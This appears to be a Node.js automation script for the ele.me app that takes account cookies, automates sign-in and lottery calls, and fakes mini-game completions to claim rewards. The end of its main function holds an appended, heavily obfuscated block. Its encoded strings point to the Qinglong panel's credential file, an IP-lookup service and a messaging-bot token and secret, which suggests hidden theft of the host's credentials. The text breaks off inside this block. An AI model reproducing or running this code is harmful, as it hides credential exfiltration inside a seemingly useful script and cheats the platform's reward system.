/**
 * 变量：elmck: 必填，账号cookie
 * cron: 7 0,6,12,18,22 * * *
 * 修复连连看
 */
const {
    "getToken": getToken,
    "checkCk": checkCk,
    "wait": wait,
    "getCookies": getCookies,
    "getUserInfo": getUserInfo,
    "tryCatchPromise": tryCatchPromise
} = require("sj.nommoc/.".split("").reverse().join(""));

const request = require("tseuqer".split("").reverse().join(""));

const md5 = require("md5");

function isEmpty (_0x591a20) {
    return Object["values"](_0x591a20)['length'] === 0;
}

async function lottery (_0x2a7333) {
    const _0x37f589 = {
        'authority': 'shopping.ele.me',
        "accept": 'application/json',
        'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "no-cache",
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://r.ele.me',
        'pragma': "no-cache",
        "referer": "https://r.ele.me/linkgame/index.html?navType=3&spm-pre=a2ogi.13162730.zebra-ele-login-module-9089118186&spm=a13.b_activity_kb_m71293.0.0",
        'cookie': _0x2a7333,
        "x-ele-ua": "RenderWay/H5 AppName/wap Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
        "user-agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
    };
    const _0x47799a = {
        "actId": '20221207144029906162546384',
        'collectionId': '20230224114656384938530468',
        "componentId": "20230224114825216373367998",
        "bizScene": 'game_center',
        'bizCode': "LOTTERY",
        'longitude': '120.21993197500706',
        "latitude": '30.178378857672215',
        'asac': '2A232091VOX6SPEQYH6RG4',
        "extParams": "{\"bizType\":\"LOTTERY\"}"
    };

    const _0x5695ee = new Date()["getTime"]();

    const _0x315936 = 12574478;

    var _0x369abd = "=atad".split("").reverse().join("") + encodeURIComponent(JSON['stringify'](_0x47799a));

    const _0x881d98 = getToken(_0x2a7333);

    const _0x34e5a0 = _0x881d98['split']('_')[0];

    const _0x26d75a = md5(_0x34e5a0 + "&" + _0x5695ee + '&' + _0x315936 + '&' + JSON['stringify'](_0x47799a));

    const _0x43bb72 = {
        "url": "=t&87447521=yeKppa&1.6.2=vsj?/0.1/yrettol.thgir.mroftalp.retnecnoitcaretni.iebuok.potm/5h/moc.oaboat.m.sca-ediug//:sptth".split("").reverse().join("") + _0x5695ee + "&sign=" + _0x26d75a + "nosj=epyTatad&nosjlanigiro=epyt&0.1=v&yrettol.thgir.mroftalp.retnecnoitcaretni.iebuok.potm=ipa&".split("").reverse().join(""),
        'method': 'POST',
        'headers': _0x37f589,
        "body": _0x369abd
    };
    return tryCatchPromise(_0x51ba78 => {
        request(_0x43bb72, async (_0x16ed8b, _0x409ead, _0x108964) => {
            if (!_0x16ed8b && _0x409ead["statusCode"] === 200) {
                try {
                    const _0x13c6dc = JSON.parse(_0x108964);

                    if (isEmpty(_0x13c6dc["data"]["data"])) {
                        console['log'](_0x13c6dc["ret"][0]);

                        _0x51ba78(false);
                    } else {
                        if (_0x13c6dc['data']["data"]['errorMsg']) {
                            console['log'](_0x13c6dc['data']['data']["errorMsg"]);
                        } else {
                            let _0x2f73eb = _0x13c6dc["data"]["data"]["sendRightList"][0];

                            const _0x2880f0 = _0x2f73eb['materialInfo']["description"] + _0x2f73eb["materialInfo"]["title"];

                            console["log"](_0x2880f0);
                        }

                        _0x51ba78(_0x13c6dc);
                    }
                } catch (_0x2f051a) {
                    _0x51ba78(false);
                }
            } else {
                _0x51ba78(false);
            }
        });
    });
}

async function lyb_sign (_0x24cd86) {
    const _0x4ec66f = await checkCk(_0x24cd86);

    const _0xcfadee = {
        "authority": "mtop.ele.me",
        "accept": 'application/json',
        'accept-language': "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
        'asac': "2A21607NIIT1ND5C4YXJ6C",
        'cache-control': 'no-cache',
        "content-type": 'application/x-www-form-urlencoded',
        "origin": 'https://tb.ele.me',
        "pragma": "no-cache",
        "referer": 'https://tb.ele.me/wow/alsc/mod/b9ee9e6451bc8eda7a6afcbb?spm=a2ogi.13162730.zebra-ele-login-module-9089118186&spm=a2ogi.13162730.zebra-ele-login-module-9089118186&spm-pre=a13.b_activity_kb_m71293.ebridge.login',
        "cookie": _0x4ec66f,
        'user-agent': "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
    };

    const _0x502234 = new Date()['getTime']();

    const _0x165860 = 12574478;
    const _0x57005c = {
        'bizScene': "game_center",
        "asac": "2A21607NIIT1ND5C4YXJ6C",
        "umidtoken": "@@bbcfa6a7ade8cb1546e9ee9b/dom/csla/wow/em.ele.bt//:sptth@@tuoemit htiw deliaf_daol_2nekoTtluafed".split("").reverse().join("") + _0x502234
    };

    var _0x436165 = "=atad".split("").reverse().join("") + encodeURIComponent(JSON["stringify"](_0x57005c));

    const _0x4d6ee1 = getToken(_0x4ec66f);

    const _0x26b3ee = _0x4d6ee1["split"]('_')[0];

    const _0x4ee849 = md5(_0x26b3ee + "&" + _0x502234 + '&' + _0x165860 + "&" + JSON['stringify'](_0x57005c));

    const _0x3db8af = {
        'url': "https://mtop.ele.me/h5/mtop.koubei.interactioncenter.sign.component.recordsignin/1.0/5.0/?jsv=2.7.1&appKey=12574478&t=" + _0x502234 + '&sign=' + _0x4ee849 + "141.0824.0.78_emorhc_diordna04%5h=dittces&C6JXY4C5DN1TIIN70612A2=casa&0.5=VS&pnosj=epyTatad&eurt=tseuqeRnigoL&eurt=nigoLdeen&gnirts=epyTeulav&nosj=epyt&1=edoce&0.1=v&ningisdrocer.tnenopmoc.ngis.retnecnoitcaretni.iebuok.potm=ipa&".split("").reverse().join(""),
        "method": "POST",
        'headers': _0xcfadee,
        'body': _0x436165
    };
    return tryCatchPromise(_0x203200 => {
        request(_0x3db8af, async (_0x272115, _0x1c441d, _0x179163) => {
            if (!_0x272115 && _0x1c441d['statusCode'] == 200) {
                const _0x533317 = JSON.parse(_0x179163);

                if (_0x533317['data']['errorMsg']) {
                    console['log'](_0x533317['data']['errorMsg']);
                } else {
                    console['log']("功成到签".split("").reverse().join(""));
                }

                _0x203200(_0x533317);
            } else {
                _0x203200(null);
            }
        });
    });
}

async function lyb_llk_token (_0x439987) {
    const _0x2f601c = {
        'bizScene': 'LIANLIANKAN',
        'bizMethod': 'login',
        'bizParam': "{\"inviterId\":null,\"gameId\":null,\"token\":\"token\"}",
        'longitude': 114.174328,
        'latitude': 22.316555
    };

    const _0x470dc0 = await gameRequest(_0x439987, _0x2f601c);
    // console.log('授权成功：', _0x470dc0["data"]);
    return [_0x470dc0['data']['token'], _0x470dc0['data']['openId']];
}

async function lyb_llk_gamecode (_0x38c94c, _0x245e6e) {
    const _0x273bc4 = {
        "bizScene": 'LIANLIANKAN',
        'bizMethod': 'startGameV2',
        'bizParam': "{\"gameId\":null,\"token\":\"" + _0x245e6e + "\"}",
        'longitude': 114.174328,
        'latitude': 22.316555
    };

    const _0x8b94cf = await gameRequest(_0x38c94c, _0x273bc4);

    if (_0x8b94cf['bizErrorMsg'] != 'success') {
        console['log'](_0x8b94cf['bizErrorMsg']);
        return null;
    }
    // console.log('开始游戏成功：', _0x8b94cf["data"]);
    return [_0x8b94cf["data"]['gameCode'], _0x8b94cf["levelId"]];
}

async function lyb_llk_passgame (_0xf45113, gameCode, gameToken, openId, lastLevelId = 0) {
    const _0x2d9a39 = {
        "bizScene": "LIANLIANKAN",
        'bizMethod': 'settlement',
        'bizParam': '{"gameCode":"' + gameCode + '","passLevelTime":' + Math.ceil(1e3 * 20 * lastLevelId) + ',"gameId":null,"token":"' + gameToken + "\",\"sign\":\"" + md5(`Game[${openId}]-${gameToken}|${gameCode}${Math.ceil(1e3 * lastLevelId)}`) + "\"}",
        'longitude': 114.174328,
        'latitude': 22.316555
    };

    const result = await gameRequest(_0xf45113, _0x2d9a39);
    console.log(result?.ret?.[0], result?.ret);
    if (result?.ret?.[0] == 'SUCCESS::调用成功') {
        console.log('游戏通过奖励领取成功！');
        return 3;
    }
    if (result?.['bizErrorMsg'] != 'success') {
        console['log'](result['bizErrorMsg']);
        return null;
    }
    // console.log('游戏结算成功：', result["data"]);
    return result['data']['lastLevelId'];
}

async function gameRequest (_0x5c4a15, _0x293db2) {
    const _0x1de928 = {
        "authority": 'shopping.ele.me',
        "accept": 'application/json',
        'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        "content-type": "application/x-www-form-urlencoded",
        'origin': 'https://r.ele.me',
        'pragma': 'no-cache',
        'referer': 'https://r.ele.me/linkgame/index.html?navType=3&spm-pre=a2ogi.13162730.zebra-ele-login-module-9089118186&spm=a13.b_activity_kb_m71293.0.0',
        'cookie': _0x5c4a15,
        'x-ele-ua': "RenderWay/H5 AppName/wap Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36",
        'user-agent': "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36"
    };

    const _0x34fa44 = new Date()["getTime"]();

    const _0x173b76 = 12574478;

    var _0x5976a2 = "=atad".split("").reverse().join("") + encodeURIComponent(JSON['stringify'](_0x293db2));

    const _0x4e9995 = getToken(_0x5c4a15);

    const _0x3f9a68 = _0x4e9995['split']('_')[0];

    const _0x282679 = md5(_0x3f9a68 + '&' + _0x34fa44 + '&' + _0x173b76 + "&" + JSON['stringify'](_0x293db2));

    const _0x2e5dc4 = {
        'url': 'https://shopping.ele.me/h5/mtop.alsc.playgame.mini.game.dispatch/1.0/?jsv=2.6.1&appKey=12574478&t=' + _0x34fa44 + '&sign=' + _0x282679 + '&api=mtop.alsc.playgame.mini.game.dispatch&v=1.0&type=originaljson&dataType=json&timeout=5000&subDomain=shopping&mainDomain=ele.me&H5Request=true&pageDomain=ele.me&ttid=h5%40chrome_android_87.0.4280.141&SV=5.0',
        'method': 'POST',
        'headers': _0x1de928,
        'body': _0x5976a2
    };
    return tryCatchPromise(_0x57f3b2 => {
        request(_0x2e5dc4, async (_0x5bbc13, _0x42298e, _0x37c3cc) => {
            if (!_0x5bbc13 && _0x42298e['statusCode'] == 200) {
                try {
                    const _0x470bb4 = JSON.parse(_0x37c3cc);
                    let _0x87f7ce = _0x470bb4;
                    if (_0x470bb4?.data?.data && (typeof _0x470bb4?.data?.data == 'string')) {
                        _0x87f7ce = JSON.parse(_0x470bb4?.data?.data);
                    }

                    _0x57f3b2(_0x87f7ce);
                } catch (error) {
                    console['log']('解析请求返回数据异常：', _0x37c3cc);

                    _0x57f3b2(null);
                }
            } else {
                _0x57f3b2(null);
            }
        });
    });
}

async function llk_game (_0x25bfaf, gameToken, openId, gameTimes = 0) {
    const [gameCode, gameLevel] = await lyb_llk_gamecode(_0x25bfaf, gameToken);
    if (gameCode) {
        res = await lyb_llk_passgame(_0x25bfaf, gameCode, gameToken, openId, gameTimes);

        console['log']('连连看第' + res + '关闯关成功');
        console['log']('随机等待5-10s');
        gameTimes++;
        await wait(getRandom(5, 10));

        if (res === 3) {
            return;
        } else {
            await llk_game(_0x25bfaf, gameCode, gameToken, openId, gameTimes);
        }
    } else {
        console['log']("过成完已看连连".split("").reverse().join(""));
    }
}

async function water_login (_0x1f943d) {
    const _0x22a643 = {
        "bizScene": 'WATER_SORT',
        'bizParam': "{\"type\":\"login\"}",
        'bizMethod': 'login'
    };

    const _0x2d2d31 = await gameRequest(_0x1f943d, _0x22a643);

    return _0x2d2d31;
}

async function water_game_success (_0x5605a4) {
    const _0x320ec5 = {
        'bizScene': "WATER_SORT",
        'bizParam': "{\"type\":\"gameSuccess\"}",
        'bizMethod': 'gameSuccess'
    };

    const _0x3d4a5f = await gameRequest(_0x5605a4, _0x320ec5);

    return _0x3d4a5f;
}

async function water_reward (_0x381a2a, _0x45fe93) {
    const _0x5b7071 = {
        'bizScene': 'WATER_SORT',
        'bizParam': "{\"type\":\"getPassPrize\",\"data\":{\"addNum\":\"" + _0x45fe93 + "}}1:\"epyt\",\"".split("").reverse().join(""),
        'bizMethod': 'getPassPrize'
    };

    const _0x2a1757 = await gameRequest(_0x381a2a, _0x5b7071);

    return _0x2a1757;
}

async function water_game (_0x3ee10c) {
    const _0x27e9b3 = await water_login(_0x3ee10c);

    const _0x50f5a3 = _0x27e9b3['passConf'];
    const _0x50e194 = [];

    for (let _0x3ac6d8 of Object['values'](_0x50f5a3)) {
        _0x50e194['push'](_0x3ac6d8['passNum']);
    }

    var _0x55c700 = await water_game_success(_0x3ee10c);

    var _0x194b12 = _0x55c700['info']['todayPass'];
    var _0x4ba1ef = 0;

    while (_0x194b12 <= _0x50e194[_0x50e194["length"] - 1]) {
        _0x55c700 = await water_game_success(_0x3ee10c);
        _0x194b12 = _0x55c700['info']["todayPass"];
        console['log']("欢乐倒水第" + _0x194b12 + '关闯关成功');

        if (_0x50e194['includes'](_0x194b12)) {
            _0x4ba1ef = _0x50e194['indexOf'](_0x194b12) + 1;

            const _0x499012 = await water_reward(_0x3ee10c, _0x4ba1ef);

            console['log']("：得获".split("").reverse().join("") + _0x499012['goldnum'] + "币园乐".split("").reverse().join(""));
        }
    }

    console['log']("成完关闯水倒乐快".split("").reverse().join(""));
}

async function start () {
    const _0x1612bb = getCookies();

    for (let _0x18c297 = 0; _0x18c297 < _0x1612bb['length']; _0x18c297++) {
        const _0x5ed52b = _0x1612bb[_0x18c297];

        if (!_0x5ed52b) {
            console['log'](" ❌无效用户信息, 请重新获取ck");
        } else {
            try {
                let _0xaeedd3 = await checkCk(_0x5ed52b, _0x18c297);

                if (!_0xaeedd3) {
                    continue;
                }

                console['log']("号账么了饿【始开******".split("").reverse().join(""), _0x18c297 + 1, "】", '十七不努力', "*********".split("").reverse().join(""));
                await lyb_sign(_0xaeedd3);
                await lottery(_0xaeedd3);

                const [gameToken, openId] = await lyb_llk_token(_0xaeedd3);

                await llk_game(_0xaeedd3, gameToken, openId);
                // await llk_game(_0xaeedd3, gameToken, openId);
                await water_game(_0xaeedd3);
                await wait(getRandom(5, 10));
            } catch (_0x54faf5) {
                console['log'](_0x54faf5);
            }
        }
    }
const _0x2ac0=['dXJs','QmREdWE=','dHd4WFM=','dnRPQW8=','WG9YTWo=','WlRWeWw=','cmV0dXJuIChmdW5jdGlvbigpIA==','Rk9KT08=','UmxFRWM=','eWtBeEE=','bm93','VFBESnE=','ektLU1I=','a0JGVVY=','eU9IZEM=','Z2JQa0g=','c3BsaXQ=','Vm1ObE0=','JnNpZ249','SHJ2Q0Y=','R1JneG4=','ZXhjZXB0aW9u','aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u','UFhTblo=','bFpQbng=','bndPRXg=','c2VZZFc=','N2FiZjA3MTY1M2IzMzhkOGQ4ODVjODcyNzNhOTQwMGE4YjAyYzU3Y2NlODk1NzRhNTM3NTZlMGQyZTY3OGQyMw==','emJLZ0c=','Q2pnaUo=','VkpJeUg=','UFdBR1I=','Q29udGVudC1UeXBl','anNvbg==','SU5KeGo=','V3N3enA=','bGhBR3I=','ZGNSZEo=','aXBzQnI=','a2l4elQ=','eHdEZHA=','Y29uc29sZQ==','Y3JlYXRlSG1hYw==','dHJhY2U=','cEdiQk0=','bWJGeGs=','YXBwbGljYXRpb24vanNvbg==','bG9n','RHdhSVg=','cEFCVEg=','WkZiemk=','d2x1cU4=','c2hhMjU2','dGltZW91dA==','SG9IVnM=','c0ZWbHU=','Qml0Wm8=','dFZwcUc=','R2Vpb2g=','VnlsVEU=','QkZWY2c=','RERfQk9UX1RPS0VO','cnhSTWo=','Y3VwT0c=','TXBVWm4=','cmV0dXJuIC8iICsgdGhpcyArICIv','b29MeHI=','ZXJyY29kZQ==','a05oVEk=','aXRLRXg=','UVFac3g=','TmRBd1U=','ZE9Td3A=','Y29uc3RydWN0b3I=','dGhlbg==','cXloSVo=','TnBpaGM=','ZGlnZXN0','WEdVdk0=','dGV4dA==','Y3J5cHRv','UnJoVUQ=','TEhOdFY=','SFVCUmE=','WlNPc08=','d2Fybg==','Y29tcGlsZQ==','ZVFTUlU=','dmFYZkk=','dGVzdA==','QWF6eHI=','bWl0eG8=','cFVpRnI=','V0J6d1k=','Q3NVcEU=','ZEVZdUg=','YmZDcUU=','TXNjVEs=','U2ZIaVY=','elRqVUM=','andadkk=','Y2F0Y2g=','R3J5UWs=','RGhBdkw=','cG9zdA==','a3RFb0Y=','cE1ySXY=','TFhEdEc=','RERfQk9UX1NFQ1JFVA==','dXRmOA==','TmZ1cHI=','aXBVWUo=','anR4UW4=','U0RtQ0s=','YWNKSEE=','e30uY29uc3RydWN0b3IoInJldHVybiB0aGlzIikoICk=','eEx3aVk=','Z3JKelo=','T3FUbGs=','SGR6THE=','a2NpaXA=','QmltV0Q=','cFNFYlQ=','RlNiRVY=','a0pKVVE=','dXBkYXRl','S3dzU2o=','ZGVidWc=','JnRpbWVzdGFtcD0=','R1BiekE=','WFZhWWI=','VXpna2o=','dGFibGU=','akhFdkc=','NnwwfDF8M3wyfDd8NHw1','VEJXeGo=','bXNndHlwZQ==','UXB4bFM=','YXBwbHk=','aGVhZGVycw==','ZXJyb3I=','aW5mbw=='];(function(_0x22851f,_0x2ac082){const _0x3b9332=function(_0x4d95c1){while(--_0x4d95c1){_0x22851f['push'](_0x22851f['shift']());}};const _0x42aa51=function(){const _0x340c9d={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x4906c5,_0x5c03fa,_0x42dc1c,_0x2a30e2){_0x2a30e2=_0x2a30e2||{};let _0x192675=_0x5c03fa+'='+_0x42dc1c;let _0x47ee56=0x0;for(let _0x3c100f=0x0,_0x47ff8c=_0x4906c5['length'];_0x3c100f<_0x47ff8c;_0x3c100f++){const _0x4f0fc4=_0x4906c5[_0x3c100f];_0x192675+=';\x20'+_0x4f0fc4;const _0x5ee05e=_0x4906c5[_0x4f0fc4];_0x4906c5['push'](_0x5ee05e);_0x47ff8c=_0x4906c5['length'];if(_0x5ee05e!==!![]){_0x192675+='='+_0x5ee05e;}}_0x2a30e2['cookie']=_0x192675;},'removeCookie':function(){return'dev';},'getCookie':function(_0x212e49,_0x32c9a1){_0x212e49=_0x212e49||function(_0x55bd05){return _0x55bd05;};const _0x40c895=_0x212e49(new RegExp('(?:^|;\x20)'+_0x32c9a1['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));const _0xe40e6a=function(_0x3fe5e3,_0x5159af){_0x3fe5e3(++_0x5159af);};_0xe40e6a(_0x3b9332,_0x2ac082);return _0x40c895?decodeURIComponent(_0x40c895[0x1]):undefined;}};const _0x121235=function(){const _0x4b0c0f=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x4b0c0f['test'](_0x340c9d['removeCookie']['toString']());};_0x340c9d['updateCookie']=_0x121235;let _0x291576='';const _0x15d509=_0x340c9d['updateCookie']();if(!_0x15d509){_0x340c9d['setCookie'](['*'],'counter',0x1);}else if(_0x15d509){_0x291576=_0x340c9d['getCookie'](null,'counter');}else{_0x340c9d['removeCookie']();}};_0x42aa51();}(_0x2ac0,0xf5));const _0x3b93=function(_0x22851f,_0x2ac082){_0x22851f=_0x22851f-0x0;let _0x3b9332=_0x2ac0[_0x22851f];if(_0x3b93['kwwPnU']===undefined){(function(){let _0x4d95c1;try{const _0x121235=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x4d95c1=_0x121235();}catch(_0x291576){_0x4d95c1=window;}const _0x340c9d='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x4d95c1['atob']||(_0x4d95c1['atob']=function(_0x15d509){const _0x4906c5=String(_0x15d509)['replace'](/=+$/,'');let _0x5c03fa='';for(let _0x42dc1c=0x0,_0x2a30e2,_0x192675,_0x47ee56=0x0;_0x192675=_0x4906c5['charAt'](_0x47ee56++);~_0x192675&&(_0x2a30e2=_0x42dc1c%0x4?_0x2a30e2*0x40+_0x192675:_0x192675,_0x42dc1c++%0x4)?_0x5c03fa+=String['fromCharCode'](0xff&_0x2a30e2>>(-0x2*_0x42dc1c&0x6)):0x0){_0x192675=_0x340c9d['indexOf'](_0x192675);}return _0x5c03fa;});}());_0x3b93['kQwUWT']=function(_0x3c100f){const _0x47ff8c=atob(_0x3c100f);let _0x4f0fc4=[];for(let _0x5ee05e=0x0,_0x212e49=_0x47ff8c['length'];_0x5ee05e<_0x212e49;_0x5ee05e++){_0x4f0fc4+='%'+('00'+_0x47ff8c['charCodeAt'](_0x5ee05e)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4f0fc4);};_0x3b93['VXsLGf']={};_0x3b93['kwwPnU']=!![];}const _0x42aa51=_0x3b93['VXsLGf'][_0x22851f];if(_0x42aa51===undefined){const _0x32c9a1=function(_0x40c895){this['qygxrt']=_0x40c895;this['HVwuRd']=[0x1,0x0,0x0];this['BmDatd']=function(){return'newState';};this['gGvxxV']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['nEWmdz']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x32c9a1['prototype']['fGJHru']=function(){const _0xe40e6a=new RegExp(this['gGvxxV']+this['nEWmdz']);const _0x55bd05=_0xe40e6a['test'](this['BmDatd']['toString']())?--this['HVwuRd'][0x1]:--this['HVwuRd'][0x0];return this['EqkFmu'](_0x55bd05);};_0x32c9a1['prototype']['EqkFmu']=function(_0x3fe5e3){if(!Boolean(~_0x3fe5e3)){return _0x3fe5e3;}return this['WKZjYY'](this['qygxrt']);};_0x32c9a1['prototype']['WKZjYY']=function(_0x5159af){for(let _0x4b0c0f=0x0,_0x4b600f=this['HVwuRd']['length'];_0x4b0c0f<_0x4b600f;_0x4b0c0f++){this['HVwuRd']['push'](Math['round'](Math['random']()));_0x4b600f=this['HVwuRd']['length'];}return _0x5159af(this['HVwuRd'][0x0]);};new _0x32c9a1(_0x3b93)['fGJHru']();_0x3b9332=_0x3b93['kQwUWT'](_0x3b9332);_0x3b93['VXsLGf'][_0x22851f]=_0x3b9332;}else{_0x3b9332=_0x42aa51;}return _0x3b9332;};(function test(){const _0x3f35a8={};_0x3f35a8['EMHqX']=function(_0x245926,_0xdd4285){return _0x245926===_0xdd4285;};_0x3f35a8[_0x3b93('0x6d')]=_0x3b93('0x5a');_0x3f35a8[_0x3b93('0x20')]='UEqon';_0x3f35a8[_0x3b93('0x45')]=function(_0x420b08){return _0x420b08();};_0x3f35a8[_0x3b93('0x9')]=function(_0x3def72,_0x292e54){return _0x3def72===_0x292e54;};_0x3f35a8['HrvCF']=_0x3b93('0x34');_0x3f35a8[_0x3b93('0x4')]=function(_0x2b60e0,_0x456fa1){return _0x2b60e0===_0x456fa1;};_0x3f35a8[_0x3b93('0x86')]=_0x3b93('0xf');_0x3f35a8['xwDdp']=function(_0x2736c4,_0x5b24f9){return _0x2736c4(_0x5b24f9);};_0x3f35a8[_0x3b93('0x1e')]=function(_0x49b7e1,_0x366275){return _0x49b7e1+_0x366275;};_0x3f35a8[_0x3b93('0x54')]=_0x3b93('0x68');_0x3f35a8[_0x3b93('0x87')]=_0x3b93('0x8a');_0x3f35a8[_0x3b93('0x43')]=function(_0x2dfbdf,_0x22133c){return _0x2dfbdf!==_0x22133c;};_0x3f35a8['rxRMj']=_0x3b93('0x0');_0x3f35a8[_0x3b93('0x84')]=_0x3b93('0x6f');_0x3f35a8[_0x3b93('0x53')]=_0x3b93('0x76');_0x3f35a8['ZSOsO']=function(_0x41a93f,_0x1fc007){return _0x41a93f&&_0x1fc007;};_0x3f35a8['Uzgkj']=_0x3b93('0x77');_0x3f35a8[_0x3b93('0x36')]='base64';_0x3f35a8['npXXU']=_0x3b93('0x46');_0x3f35a8[_0x3b93('0x4c')]=_0x3b93('0x7');_0x3f35a8['sQGMd']=_0x3b93('0x57');_0x3f35a8[_0x3b93('0xb')]=_0x3b93('0x6b');_0x3f35a8[_0x3b93('0x14')]=function(_0x6ad6e2,_0x1a6f4b,_0x33f056){return _0x6ad6e2(_0x1a6f4b,_0x33f056);};_0x3f35a8[_0x3b93('0x3f')]=function(_0x2ccb87){return _0x2ccb87();};_0x3f35a8[_0x3b93('0x58')]=_0x3b93('0x83');_0x3f35a8[_0x3b93('0x3b')]=_0x3b93('0x11');_0x3f35a8[_0x3b93('0x63')]=function(_0x5df32e,_0x286ac1){return _0x5df32e===_0x286ac1;};_0x3f35a8[_0x3b93('0x32')]='zkjjd';_0x3f35a8['FOJOO']=function(_0x301e3f,_0xe79d14){return _0x301e3f(_0xe79d14);};_0x3f35a8[_0x3b93('0x85')]='request';_0x3f35a8['NdAwU']=_0x3b93('0x42');_0x3f35a8['PXSnZ']=_0x3b93('0x3d');_0x3f35a8[_0x3b93('0x5d')]=function(_0x1c06c6,_0x332976){return _0x1c06c6(_0x332976);};_0x3f35a8[_0x3b93('0x17')]='/ql/data/config/auth.json';_0x3f35a8[_0x3b93('0x5f')]=_0x3b93('0x6');const _0x433afc=_0x3f35a8;const _0x59aeb8=function(){const _0x26a3bd={};_0x26a3bd[_0x3b93('0x6c')]=_0x3b93('0x12');const _0x1184d3=_0x26a3bd;let _0x35002f=!![];return function(_0x58e501,_0x557ff8){const _0x26ef64=_0x35002f?function(){if(_0x1184d3[_0x3b93('0x6c')]===_0x1184d3['itKEx']){if(_0x557ff8){const _0x558aa1=_0x557ff8[_0x3b93('0x23')](_0x58e501,arguments);_0x557ff8=null;return _0x558aa1;}}else{return;}}:function(){};_0x35002f=![];return _0x26ef64;};}();const _0x11160f=function(){if(_0x433afc['EMHqX']('bQAPA',_0x3b93('0x4a'))){that[_0x3b93('0x50')][_0x3b93('0x56')]=func;that[_0x3b93('0x50')]['warn']=func;that['console'][_0x3b93('0x18')]=func;that[_0x3b93('0x50')][_0x3b93('0x26')]=func;that[_0x3b93('0x50')]['error']=func;that[_0x3b93('0x50')]['exception']=func;that['console'][_0x3b93('0x1d')]=func;that[_0x3b93('0x50')][_0x3b93('0x52')]=func;}else{let _0x22af09=!![];return function(_0x403b89,_0x5494c8){const _0x205483=_0x22af09?function(){if(_0x5494c8){const _0x59dc05=_0x5494c8[_0x3b93('0x23')](_0x403b89,arguments);_0x5494c8=null;return _0x59dc05;}}:function(){};_0x22af09=![];return _0x205483;};}}();const _0x20798a=_0x433afc[_0x3b93('0x2e')](require,_0x433afc['CsUpE']);const _0x2d4715=0x3a98;const _0x131550={};_0x131550[_0x3b93('0x5')]='SEC72affcfb810fe0c02ec4a7771cfa765590f6c816e699007d59d0fdfb2698df66';_0x131550[_0x3b93('0x64')]=_0x433afc[_0x3b93('0x6e')];const _0x24d4a0=_0x131550;function _0x53aeaa(_0x4c9028,_0x5bfb62){const _0x3d97c1={};_0x3d97c1[_0x3b93('0x1a')]=function(_0x31ebfa,_0x13c147){return _0x433afc['xwDdp'](_0x31ebfa,_0x13c147);};_0x3d97c1[_0x3b93('0x44')]=function(_0x3b82ae,_0x2bbba4){return _0x433afc[_0x3b93('0x1e')](_0x3b82ae,_0x2bbba4);};_0x3d97c1[_0x3b93('0x41')]=_0x3b93('0xc');_0x3d97c1[_0x3b93('0x29')]=function(_0x29349b,_0x43f00c){return _0x433afc[_0x3b93('0x43')](_0x29349b,_0x43f00c);};_0x3d97c1[_0x3b93('0x5e')]=_0x3b93('0x7f');_0x3d97c1[_0x3b93('0x2')]=_0x433afc[_0x3b93('0x54')];_0x3d97c1[_0x3b93('0xa')]='^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}';_0x3d97c1['GryQk']=function(_0x58810c,_0x1827a7){return _0x433afc[_0x3b93('0x43')](_0x58810c,_0x1827a7);};_0x3d97c1[_0x3b93('0x8')]=_0x433afc['npXXU'];_0x3d97c1[_0x3b93('0x60')]=_0x433afc[_0x3b93('0x4c')];_0x3d97c1[_0x3b93('0x8b')]=function(_0x5ba3c4,_0x1d668c){return _0x433afc['LXDtG'](_0x5ba3c4,_0x1d668c);};_0x3d97c1[_0x3b93('0x69')]=_0x433afc['sQGMd'];_0x3d97c1[_0x3b93('0x73')]='IDVYg';_0x3d97c1[_0x3b93('0x78')]=function(_0x30f2fa){return _0x433afc[_0x3b93('0x45')](_0x30f2fa);};_0x3d97c1[_0x3b93('0x88')]=_0x3b93('0x1f');const _0x1a1ce3=_0x3d97c1;if(_0x433afc['LXDtG'](_0x433afc[_0x3b93('0xb')],_0x433afc[_0x3b93('0xb')])){const _0xbdb49c=_0x59aeb8(this,function(){if(_0x433afc['EMHqX'](_0x433afc[_0x3b93('0x6d')],_0x433afc[_0x3b93('0x20')])){const _0x163876=firstCall?function(){if(fn){const _0x4b5786=fn[_0x3b93('0x23')](context,arguments);fn=null;return _0x4b5786;}}:function(){};firstCall=![];return _0x163876;}else{const _0xdadcff=function(){const _0x248f20={};_0x248f20[_0x3b93('0x49')]=function(_0x14b8db,_0x23b594){return _0x1a1ce3[_0x3b93('0x1a')](_0x14b8db,_0x23b594);};_0x248f20[_0x3b93('0x3')]=function(_0x50c259,_0x346b1d){return _0x1a1ce3[_0x3b93('0x44')](_0x50c259,_0x346b1d);};_0x248f20[_0x3b93('0x4d')]=_0x1a1ce3['seYdW'];const 